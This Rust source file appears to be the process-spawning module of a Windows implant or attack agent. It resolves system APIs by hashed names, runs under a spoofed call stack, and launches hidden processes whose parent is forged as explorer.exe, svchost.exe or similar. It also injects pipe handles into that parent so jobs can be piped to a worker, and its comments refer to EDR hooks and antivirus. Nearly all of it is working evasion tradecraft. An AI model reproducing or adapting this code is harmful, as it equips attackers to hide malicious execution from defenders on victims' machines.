// PPID-spoofed process creation — two-layer architecture.
//
// Layer A (default, version-agnostic): CreateProcessW + PEB-resolved attribute APIs.
// Layer B (stealth-adv + version gate): NtCreateUserProcess; on any failure → layer A.
//
// - Parent find / open: Nt* (process module)
// - Handle close: NtClose
// - Entire create path runs under with_spoofed_stack

use std::os::windows::ffi::OsStrExt;
use std::ptr;

use crate::stealth;

const CREATE_NO_WINDOW: u32 = 0x0800_0000;
const EXTENDED_STARTUPINFO_PRESENT: u32 = 0x0008_0000;
const STARTF_USESTDHANDLES: u32 = 0x0000_0100;
const HANDLE_FLAG_INHERIT: u32 = 0x0000_0001;
/// PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: usize = 0x0002_0000;

/// Child process with inherited stdio pipes (parent keeps write/read ends).
pub struct SpoofedPipedChild {
    pub pid: u32,
    pub h_process: usize,
    /// Parent writes job to child stdin
    pub stdin_write: usize,
    /// Parent reads result from child stdout
    pub stdout_read: usize,
}

#[repr(C)]
struct ProcessInformation {
    h_process: usize,
    h_thread: usize,
    dw_process_id: u32,
    dw_thread_id: u32,
}

#[repr(C)]
struct StartupInfoW {
    cb: u32,
    reserved: usize,
    desktop: usize,
    title: usize,
    dw_x: u32,
    dw_y: u32,
    dw_x_size: u32,
    dw_y_size: u32,
    dw_x_count_chars: u32,
    dw_y_count_chars: u32,
    dw_fill_attribute: u32,
    dw_flags: u32,
    w_show_window: u16,
    cb_reserved2: u16,
    lp_reserved2: usize,
    h_std_input: usize,
    h_std_output: usize,
    h_std_error: usize,
}

#[repr(C)]
struct StartupInfoExW {
    startup_info: StartupInfoW,
    lp_attribute_list: *mut u8,
}

type InitAttrListFn = unsafe extern "system" fn(*mut u8, u32, u32, *mut usize) -> i32;
type UpdateAttrFn =
    unsafe extern "system" fn(*mut u8, u32, usize, *mut u8, usize, *mut u8, *mut usize) -> i32;
type DeleteAttrListFn = unsafe extern "system" fn(*mut u8);
type CreateProcessWFn = unsafe extern "system" fn(
    *const u16,
    *mut u16,
    *mut u8,
    *mut u8,
    i32,
    u32,
    *mut u8,
    *const u16,
    *mut StartupInfoW,
    *mut ProcessInformation,
) -> i32;
type CreatePipeFn = unsafe extern "system" fn(*mut usize, *mut usize, *mut u8, u32) -> i32;
type SetHandleInformationFn = unsafe extern "system" fn(usize, u32, u32) -> i32;
type WriteFileFn = unsafe extern "system" fn(usize, *const u8, u32, *mut u32, *mut u8) -> i32;
type ReadFileFn = unsafe extern "system" fn(usize, *mut u8, u32, *mut u32, *mut u8) -> i32;
type DuplicateHandleFn =
    unsafe extern "system" fn(usize, usize, usize, *mut usize, u32, i32, u32) -> i32;

const DUPLICATE_SAME_ACCESS: u32 = 0x0000_0002;
const DUPLICATE_CLOSE_SOURCE: u32 = 0x0000_0001;

struct Kernel32SpawnApis {
    init_attr: InitAttrListFn,
    update_attr: UpdateAttrFn,
    delete_attr: DeleteAttrListFn,
    create_process_w: CreateProcessWFn,
    create_pipe: CreatePipeFn,
    set_handle_info: SetHandleInformationFn,
    write_file: WriteFileFn,
    read_file: ReadFileFn,
    duplicate_handle: DuplicateHandleFn,
}

unsafe fn resolve_spawn_apis() -> Option<Kernel32SpawnApis> {
    let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
    if k32 == 0 {
        return None;
    }
    let kbase = stealth::get_module_base(stealth::hash_module_name(b"kernelbase.dll"));
    let attr_mod = if kbase != 0 { kbase } else { k32 };

    let init_attr = stealth::get_api_addr(
        attr_mod,
        stealth::hash_api_name(b"InitializeProcThreadAttributeList"),
    )?;
    let update_attr = stealth::get_api_addr(
        attr_mod,
        stealth::hash_api_name(b"UpdateProcThreadAttribute"),
    )?;
    let delete_attr = stealth::get_api_addr(
        attr_mod,
        stealth::hash_api_name(b"DeleteProcThreadAttributeList"),
    )?;
    let create_process_w = stealth::get_api_addr(k32, stealth::hash_api_name(b"CreateProcessW"))?;
    let create_pipe = stealth::get_api_addr(k32, stealth::hash_api_name(b"CreatePipe"))?;
    let set_handle_info =
        stealth::get_api_addr(k32, stealth::hash_api_name(b"SetHandleInformation"))?;
    let write_file = stealth::get_api_addr(k32, stealth::hash_api_name(b"WriteFile"))?;
    let read_file = stealth::get_api_addr(k32, stealth::hash_api_name(b"ReadFile"))?;
    let duplicate_handle =
        stealth::get_api_addr(k32, stealth::hash_api_name(b"DuplicateHandle"))?;

    Some(Kernel32SpawnApis {
        init_attr: std::mem::transmute(init_attr),
        update_attr: std::mem::transmute(update_attr),
        delete_attr: std::mem::transmute(delete_attr),
        create_process_w: std::mem::transmute(create_process_w),
        create_pipe: std::mem::transmute(create_pipe),
        set_handle_info: std::mem::transmute(set_handle_info),
        write_file: std::mem::transmute(write_file),
        read_file: std::mem::transmute(read_file),
        duplicate_handle: std::mem::transmute(duplicate_handle),
    })
}

/// Spawn `cmd` with spoofed parent process name match and hidden window.
/// Returns child PID on success.
pub fn spawn_spoofed_process(cmd: &str, parent_name: &str) -> Option<u32> {
    crate::stealth::stack::with_spoofed_stack(|| spawn_spoofed_process_inner(cmd, parent_name))
}

fn spawn_spoofed_process_inner(cmd: &str, parent_name: &str) -> Option<u32> {
    let ppid = crate::native::find_pid_by_name(parent_name)?;
    if ppid == 0 {
        return None;
    }

    let parent_handle =
        crate::native::open_process(ppid, crate::native::PROCESS_CREATE_PROCESS).ok()?;

    // Layer B: stealth-adv + version gate → NtCreateUserProcess (graceful fallback).
    #[cfg(feature = "stealth-adv")]
    {
        if crate::stealth::version::is_supported_for_nt_create_user_process() {
            match crate::stealth::adv::try_nt_create_user_process_ppid(cmd, parent_handle) {
                Ok(pid) => {
                    let _ = crate::native::close_handle(parent_handle);
                    return Some(pid);
                }
                Err(e) => {
                    crate::utils::db_print(&format!(
                        "[agent] spawn: NtCreateUserProcess failed ({e}), fallback CreateProcessW"
                    ));
                }
            }
        } else {
            let v = crate::stealth::version::get_windows_version();
            crate::utils::db_print(&format!(
                "[agent] spawn: OS {}.{}.{} below NtCreateUserProcess gate, using CreateProcessW",
                v.major, v.minor, v.build
            ));
        }
    }

    // Layer A: version-agnostic CreateProcessW + attribute list (always available).
    let pid = spawn_create_process_w_dyn(cmd, parent_handle);
    let _ = crate::native::close_handle(parent_handle);
    pid
}

/// Layer A baseline: PEB-resolved CreateProcessW + parent attribute.
fn spawn_create_process_w_dyn(cmd: &str, parent_handle: usize) -> Option<u32> {
    unsafe {
        let apis = resolve_spawn_apis()?;

        let mut list_size: usize = 0;
        (apis.init_attr)(ptr::null_mut(), 1, 0, &mut list_size);
        if list_size == 0 {
            return None;
        }
        let mut list_buf = vec![0u8; list_size];
        if (apis.init_attr)(list_buf.as_mut_ptr(), 1, 0, &mut list_size) == 0 {
            return None;
        }

        let mut parent_handle_mut = parent_handle;
        if (apis.update_attr)(
            list_buf.as_mut_ptr(),
            0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            &mut parent_handle_mut as *mut _ as *mut u8,
            std::mem::size_of::<usize>(),
            ptr::null_mut(),
            ptr::null_mut(),
        ) == 0
        {
            (apis.delete_attr)(list_buf.as_mut_ptr());
            return None;
        }

        let mut si_ex: StartupInfoExW = std::mem::zeroed();
        si_ex.startup_info.cb = std::mem::size_of::<StartupInfoExW>() as u32;
        si_ex.lp_attribute_list = list_buf.as_mut_ptr();

        let mut cmd_w: Vec<u16> = std::ffi::OsStr::new(cmd)
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();
        let mut pi: ProcessInformation = std::mem::zeroed();

        let ok = (apis.create_process_w)(
            ptr::null(),
            cmd_w.as_mut_ptr(),
            ptr::null_mut(),
            ptr::null_mut(),
            0,
            CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
            ptr::null_mut(),
            ptr::null(),
            &mut si_ex.startup_info,
            &mut pi,
        );

        (apis.delete_attr)(list_buf.as_mut_ptr());

        if ok == 0 {
            return None;
        }

        let _ = crate::native::close_handle(pi.h_thread);
        let _ = crate::native::close_handle(pi.h_process);
        Some(pi.dw_process_id)
    }
}

fn last_error() -> u32 {
    unsafe {
        let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
        if k32 == 0 {
            return 0;
        }
        let Some(addr) = stealth::get_api_addr(k32, stealth::hash_api_name(b"GetLastError")) else {
            return 0;
        };
        type GetLastErrorFn = unsafe extern "system" fn() -> u32;
        let f: GetLastErrorFn = std::mem::transmute(addr);
        f()
    }
}

/// Spawn with PPID spoof + pipes. Falls back to normal parent if spoof fails.
pub fn spawn_spoofed_piped(cmdline: &str, parent_name: &str) -> Option<SpoofedPipedChild> {
    match spawn_spoofed_piped_result(cmdline, parent_name) {
        Ok(c) => Some(c),
        Err(e) => {
            crate::utils::db_print(&format!("[spawn] spoofed piped failed: {e}, trying plain"));
            spawn_piped_plain(cmdline).ok()
        }
    }
}

/// Result-based spawn for clearer agent errors.
pub fn spawn_spoofed_piped_result(
    cmdline: &str,
    parent_name: &str,
) -> Result<SpoofedPipedChild, String> {
    crate::stealth::stack::with_spoofed_stack(|| {
        // Try PPID spoof first
        match spawn_spoofed_piped_inner(cmdline, parent_name) {
            Ok(c) => Ok(c),
            Err(e1) => {
                // Try other common parents
                for alt in [
                    "explorer.exe",
                    "RuntimeBroker.exe",
                    "sihost.exe",
                    "svchost.exe",
                ] {
                    if alt.eq_ignore_ascii_case(parent_name) {
                        continue;
                    }
                    if let Ok(c) = spawn_spoofed_piped_inner(cmdline, alt) {
                        return Ok(c);
                    }
                }
                // Last resort: no PPID spoof (still works for capability)
                spawn_piped_plain(cmdline).map_err(|e2| format!("ppid:{e1}; plain:{e2}"))
            }
        }
    })
}

fn spawn_spoofed_piped_inner(
    cmdline: &str,
    parent_name: &str,
) -> Result<SpoofedPipedChild, String> {
    let ppid = crate::native::find_pid_by_name(parent_name)
        .filter(|p| *p != 0)
        .ok_or_else(|| format!("parent not found: {parent_name}"))?;
    // PROCESS_CREATE_PROCESS | PROCESS_DUP_HANDLE | PROCESS_QUERY_LIMITED_INFORMATION
    let access = crate::native::PROCESS_CREATE_PROCESS | 0x0040 | 0x1000;
    let parent_handle = crate::native::open_process(ppid, access)
        .map_err(|e| format!("open parent {parent_name} pid={ppid}: {e}"))?;

    unsafe {
        let apis = resolve_spawn_apis().ok_or("resolve spawn APIs failed")?;
        let child = create_piped_process(apis, cmdline, Some(parent_handle))?;
        let _ = crate::native::close_handle(parent_handle);
        Ok(child)
    }
}

/// CreateProcess with pipes, no PPID spoof (parent = this process).
pub fn spawn_piped_plain(cmdline: &str) -> Result<SpoofedPipedChild, String> {
    crate::stealth::stack::with_spoofed_stack(|| unsafe {
        let apis = resolve_spawn_apis().ok_or("resolve spawn APIs failed")?;
        create_piped_process(apis, cmdline, None)
    })
}

unsafe fn create_piped_process(
    apis: Kernel32SpawnApis,
    cmdline: &str,
    parent_handle: Option<usize>,
) -> Result<SpoofedPipedChild, String> {
    #[repr(C)]
    struct SecAttr {
        n_length: u32,
        lp_security_descriptor: usize,
        b_inherit_handle: i32,
    }
    let mut sa = SecAttr {
        n_length: std::mem::size_of::<SecAttr>() as u32,
        lp_security_descriptor: 0,
        b_inherit_handle: 1,
    };

    let mut stdin_r: usize = 0;
    let mut stdin_w: usize = 0;
    let mut stdout_r: usize = 0;
    let mut stdout_w: usize = 0;
    if (apis.create_pipe)(&mut stdin_r, &mut stdin_w, &mut sa as *mut _ as *mut u8, 0) == 0 {
        return Err(format!("CreatePipe stdin err={}", last_error()));
    }
    if (apis.create_pipe)(
        &mut stdout_r,
        &mut stdout_w,
        &mut sa as *mut _ as *mut u8,
        0,
    ) == 0
    {
        let _ = crate::native::close_handle(stdin_r);
        let _ = crate::native::close_handle(stdin_w);
        return Err(format!("CreatePipe stdout err={}", last_error()));
    }
    // Parent-side ends must not be inherited.
    let _ = (apis.set_handle_info)(stdin_w, HANDLE_FLAG_INHERIT, 0);
    let _ = (apis.set_handle_info)(stdout_r, HANDLE_FLAG_INHERIT, 0);

    // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS makes the child inherit handles from the
    // *spoofed parent*, not the agent. Putting agent-local pipe values into
    // STARTUPINFO yields invalid stdio → host dies → WriteFile broken pipe (109/232).
    // Fix: DuplicateHandle child-end pipes into the parent with bInheritHandle=TRUE,
    // then pass those parent-relative handle values in STARTUPINFO.
    let mut parent_stdin_r: usize = 0;
    let mut parent_stdout_w: usize = 0;
    let mut list_buf: Vec<u8> = Vec::new();
    let mut use_attr = false;
    if let Some(ph) = parent_handle {
        if (apis.duplicate_handle)(
            crate::native::CURRENT_PROCESS,
            stdin_r,
            ph,
            &mut parent_stdin_r,
            0,
            1, // inherit into child of spoofed parent
            DUPLICATE_SAME_ACCESS,
        ) == 0
        {
            cleanup_pipes(stdin_r, stdin_w, stdout_r, stdout_w);
            return Err(format!("DuplicateHandle stdin→parent err={}", last_error()));
        }
        if (apis.duplicate_handle)(
            crate::native::CURRENT_PROCESS,
            stdout_w,
            ph,
            &mut parent_stdout_w,
            0,
            1,
            DUPLICATE_SAME_ACCESS,
        ) == 0
        {
            close_remote_handle(&apis, ph, parent_stdin_r);
            cleanup_pipes(stdin_r, stdin_w, stdout_r, stdout_w);
            return Err(format!("DuplicateHandle stdout→parent err={}", last_error()));
        }
        // Agent-local child ends no longer need the inherit bit (parent holds the
        // inheritable copies). Clear it so a stray inherit=1 cannot leak them.
        let _ = (apis.set_handle_info)(stdin_r, HANDLE_FLAG_INHERIT, 0);
        let _ = (apis.set_handle_info)(stdout_w, HANDLE_FLAG_INHERIT, 0);

        let mut list_size: usize = 0;
        let _ = (apis.init_attr)(ptr::null_mut(), 1, 0, &mut list_size);
        if list_size == 0 {
            // ERROR_INSUFFICIENT_BUFFER expected; size should still be set
            list_size = 128;
        }
        list_buf = vec![0u8; list_size.max(48)];
        if (apis.init_attr)(list_buf.as_mut_ptr(), 1, 0, &mut list_size) == 0 {
            // retry with reported size
            if list_size > list_buf.len() {
                list_buf.resize(list_size, 0);
                if (apis.init_attr)(list_buf.as_mut_ptr(), 1, 0, &mut list_size) == 0 {
                    close_remote_handle(&apis, ph, parent_stdin_r);
                    close_remote_handle(&apis, ph, parent_stdout_w);
                    cleanup_pipes(stdin_r, stdin_w, stdout_r, stdout_w);
                    return Err(format!("InitAttrList err={}", last_error()));
                }
            } else {
                close_remote_handle(&apis, ph, parent_stdin_r);
                close_remote_handle(&apis, ph, parent_stdout_w);
                cleanup_pipes(stdin_r, stdin_w, stdout_r, stdout_w);
                return Err(format!("InitAttrList err={}", last_error()));
            }
        }
        let mut parent_handle_mut = ph;
        if (apis.update_attr)(
            list_buf.as_mut_ptr(),
            0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            &mut parent_handle_mut as *mut _ as *mut u8,
            std::mem::size_of::<usize>(),
            ptr::null_mut(),
            ptr::null_mut(),
        ) == 0
        {
            (apis.delete_attr)(list_buf.as_mut_ptr());
            close_remote_handle(&apis, ph, parent_stdin_r);
            close_remote_handle(&apis, ph, parent_stdout_w);
            cleanup_pipes(stdin_r, stdin_w, stdout_r, stdout_w);
            return Err(format!("UpdateAttr parent err={}", last_error()));
        }
        use_attr = true;
    }

    let mut si_ex: StartupInfoExW = std::mem::zeroed();
    si_ex.startup_info.cb = if use_attr {
        std::mem::size_of::<StartupInfoExW>() as u32
    } else {
        std::mem::size_of::<StartupInfoW>() as u32
    };
    si_ex.startup_info.dw_flags = STARTF_USESTDHANDLES;
    if use_attr {
        // Parent-relative values — child inherits these from the spoofed parent.
        si_ex.startup_info.h_std_input = parent_stdin_r;
        si_ex.startup_info.h_std_output = parent_stdout_w;
        si_ex.startup_info.h_std_error = parent_stdout_w;
        si_ex.lp_attribute_list = list_buf.as_mut_ptr();
    } else {
        si_ex.startup_info.h_std_input = stdin_r;
        si_ex.startup_info.h_std_output = stdout_w;
        si_ex.startup_info.h_std_error = stdout_w;
    }

    let mut cmd_w: Vec<u16> = std::ffi::OsStr::new(cmdline)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();
    let mut pi: ProcessInformation = std::mem::zeroed();

    let mut flags = CREATE_NO_WINDOW;
    if use_attr {
        flags |= EXTENDED_STARTUPINFO_PRESENT;
    }

    let ok = (apis.create_process_w)(
        ptr::null(),
        cmd_w.as_mut_ptr(),
        ptr::null_mut(),
        ptr::null_mut(),
        1, // inherit (from spoofed parent when use_attr, else from agent)
        flags,
        ptr::null_mut(),
        ptr::null(),
        &mut si_ex.startup_info,
        &mut pi,
    );
    let err = last_error();

    if use_attr {
        (apis.delete_attr)(list_buf.as_mut_ptr());
    }
    // Always drop agent-local child ends after CreateProcess (success or fail).
    // On success the child holds its own inherited copies via the parent.
    let _ = crate::native::close_handle(stdin_r);
    let _ = crate::native::close_handle(stdout_w);
    // Drop the temporary copies we injected into the spoofed parent so we do not
    // leak pipe handles into explorer/RuntimeBroker/etc.
    if let Some(ph) = parent_handle {
        if parent_stdin_r != 0 {
            close_remote_handle(&apis, ph, parent_stdin_r);
        }
        if parent_stdout_w != 0 {
            close_remote_handle(&apis, ph, parent_stdout_w);
        }
    }

    if ok == 0 {
        let _ = crate::native::close_handle(stdin_w);
        let _ = crate::native::close_handle(stdout_r);
        if pi.h_process != 0 {
            let _ = crate::native::close_handle(pi.h_process);
        }
        if pi.h_thread != 0 {
            let _ = crate::native::close_handle(pi.h_thread);
        }
        return Err(format!(
            "CreateProcessW failed err={err} cmd={}",
            cmdline.chars().take(120).collect::<String>()
        ));
    }

    let _ = crate::native::close_handle(pi.h_thread);
    Ok(SpoofedPipedChild {
        pid: pi.dw_process_id,
        h_process: pi.h_process,
        stdin_write: stdin_w,
        stdout_read: stdout_r,
    })
}

/// Close a handle that lives in another process (parent/child). Best-effort.
unsafe fn close_remote_handle(apis: &Kernel32SpawnApis, remote_process: usize, remote_handle: usize) {
    if remote_process == 0 || remote_handle == 0 {
        return;
    }
    let mut local = 0usize;
    // Duplicate into us + close source in the remote process, then drop local copy.
    if (apis.duplicate_handle)(
        remote_process,
        remote_handle,
        crate::native::CURRENT_PROCESS,
        &mut local,
        0,
        0,
        DUPLICATE_SAME_ACCESS | DUPLICATE_CLOSE_SOURCE,
    ) != 0
    {
        let _ = crate::native::close_handle(local);
    }
}

fn cleanup_pipes(a: usize, b: usize, c: usize, d: usize) {
    let _ = crate::native::close_handle(a);
    let _ = crate::native::close_handle(b);
    let _ = crate::native::close_handle(c);
    let _ = crate::native::close_handle(d);
}

/// Write all bytes to a pipe handle (PEB WriteFile).
/// On failure includes GetLastError — 109/232 usually means child already exited
/// (broken pipe), not a generic I/O glitch.
pub fn pipe_write_all(handle: usize, data: &[u8]) -> Result<(), String> {
    unsafe {
        let apis = resolve_spawn_apis().ok_or("spawn apis")?;
        let mut off = 0usize;
        while off < data.len() {
            let mut written = 0u32;
            let chunk = (data.len() - off).min(0x10000);
            let ok = (apis.write_file)(
                handle,
                data[off..].as_ptr(),
                chunk as u32,
                &mut written,
                ptr::null_mut(),
            );
            if ok == 0 || written == 0 {
                let err = last_error();
                let hint = match err {
                    // Historically also caused by PPID-spoof spawn that never injected
                    // pipe handles into the spoofed parent (fixed in spawn/ghost_host).
                    109 | 232 => " (broken pipe: child exited/closed stdin before job write — check worker PE, AV, or PPID pipe inherit)",
                    6 => " (invalid handle)",
                    5 => " (access denied)",
                    0 if written == 0 => " (zero bytes written)",
                    _ => "",
                };
                return Err(format!(
                    "WriteFile failed err={err} wrote={written}/{chunk} off={off}/{}{hint}",
                    data.len()
                ));
            }
            off += written as usize;
        }
        Ok(())
    }
}

/// Best-effort: has the process already exited? (for clearer spawn/pipe errors)
pub fn process_has_exited(h_process: usize) -> Option<bool> {
    if h_process == 0 {
        return None;
    }
    // Prefer GetExitCodeProcess: STILL_ACTIVE=259. Wait signal can lag briefly after
    // ACCESS_VIOLATION kills under some EDR hooks (we previously reported
    // child_exited=false with exit_code=0xC0000005).
    if let Some(code) = process_exit_code(h_process) {
        if code != 259 {
            return Some(true);
        }
    }
    // Wait 0 ms: signaled => already exited
    Some(crate::native::wait_for_single_object_timeout(h_process, 0))
}

/// Best-effort exit code via GetExitCodeProcess (STILL_ACTIVE = 259).
pub fn process_exit_code(h_process: usize) -> Option<u32> {
    if h_process == 0 {
        return None;
    }
    unsafe {
        let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
        let addr = stealth::get_api_addr(k32, stealth::hash_api_name(b"GetExitCodeProcess"))?;
        type GetExitCodeProcessFn = unsafe extern "system" fn(usize, *mut u32) -> i32;
        let f: GetExitCodeProcessFn = std::mem::transmute(addr);
        let mut code = 0u32;
        if f(h_process, &mut code) == 0 {
            return None;
        }
        Some(code)
    }
}

/// Read exact n bytes from pipe (blocks).
pub fn pipe_read_exact(handle: usize, n: usize) -> Result<Vec<u8>, String> {
    unsafe {
        let apis = resolve_spawn_apis().ok_or("spawn apis")?;
        let mut buf = vec![0u8; n];
        let mut off = 0usize;
        while off < n {
            let mut got = 0u32;
            let ok = (apis.read_file)(
                handle,
                buf[off..].as_mut_ptr(),
                (n - off) as u32,
                &mut got,
                ptr::null_mut(),
            );
            if ok == 0 || got == 0 {
                return Err("ReadFile failed/eof".into());
            }
            off += got as usize;
        }
        Ok(buf)
    }
}

/// Read until pipe EOF (child closed stdout), capped at `max_bytes`.
pub fn pipe_read_to_end(handle: usize) -> Vec<u8> {
    pipe_read_to_end_bounded(handle, 32 * 1024 * 1024)
}

/// Pure bound helper shared by the Win32 read loop and unit tests.
/// Returns how many bytes of `chunk` to keep and whether the cap is hit.
#[inline]
pub fn apply_output_bound(current_len: usize, chunk_len: usize, max_bytes: usize) -> (usize, bool) {
    if current_len >= max_bytes {
        return (0, true);
    }
    let room = max_bytes - current_len;
    if chunk_len >= room {
        (room, true)
    } else {
        (chunk_len, false)
    }
}

/// Read until pipe EOF or until `max_bytes` accumulated. Stops reading at the
/// bound but does not terminate the child — the caller owns process lifetime.
pub fn pipe_read_to_end_bounded(handle: usize, max_bytes: usize) -> Vec<u8> {
    unsafe {
        let Some(apis) = resolve_spawn_apis() else {
            return Vec::new();
        };
        let mut out = Vec::new();
        let mut chunk = [0u8; 8192];
        loop {
            let mut got = 0u32;
            let ok = (apis.read_file)(
                handle,
                chunk.as_mut_ptr(),
                chunk.len() as u32,
                &mut got,
                ptr::null_mut(),
            );
            if ok == 0 || got == 0 {
                break;
            }
            let (take, hit_cap) = apply_output_bound(out.len(), got as usize, max_bytes);
            if take > 0 {
                out.extend_from_slice(&chunk[..take]);
            }
            if hit_cap {
                break;
            }
        }
        out
    }
}

#[cfg(test)]
mod bound_tests {
    use super::apply_output_bound;

    #[test]
    fn apply_output_bound_stops_at_max() {
        let max = 100usize;
        let (take, hit) = apply_output_bound(90, 50, max);
        assert_eq!(take, 10);
        assert!(hit);
        let (take2, hit2) = apply_output_bound(0, 50, max);
        assert_eq!(take2, 50);
        assert!(!hit2);
        let (take3, hit3) = apply_output_bound(100, 10, max);
        assert_eq!(take3, 0);
        assert!(hit3);
        // Exactly at remaining room
        let (take4, hit4) = apply_output_bound(50, 50, max);
        assert_eq!(take4, 50);
        assert!(hit4);
    }

    /// Truncation behavior at the worker 2 MiB output ceiling (MAX_OUTPUT_BYTES).
    #[test]
    fn apply_output_bound_two_mib_cap() {
        // Keep independent of module-loader feature so spawn unit tests always build.
        let max = 2 * 1024 * 1024usize;
        let (take, hit) = apply_output_bound(max - 10, 100, max);
        assert_eq!(take, 10);
        assert!(hit);
        let (take2, hit2) = apply_output_bound(max, 1, max);
        assert_eq!(take2, 0);
        assert!(hit2);
        let (take3, hit3) = apply_output_bound(0, max, max);
        assert_eq!(take3, max);
        assert!(hit3);
        let (take4, hit4) = apply_output_bound(0, max - 1, max);
        assert_eq!(take4, max - 1);
        assert!(!hit4);
    }

    #[cfg(feature = "module-loader")]
    #[test]
    fn apply_output_bound_matches_max_output_bytes_const() {
        use crate::module_supervisor::MAX_OUTPUT_BYTES;
        assert_eq!(MAX_OUTPUT_BYTES, 2 * 1024 * 1024);
        let (take, hit) = apply_output_bound(MAX_OUTPUT_BYTES - 1, 8, MAX_OUTPUT_BYTES);
        assert_eq!(take, 1);
        assert!(hit);
    }
}
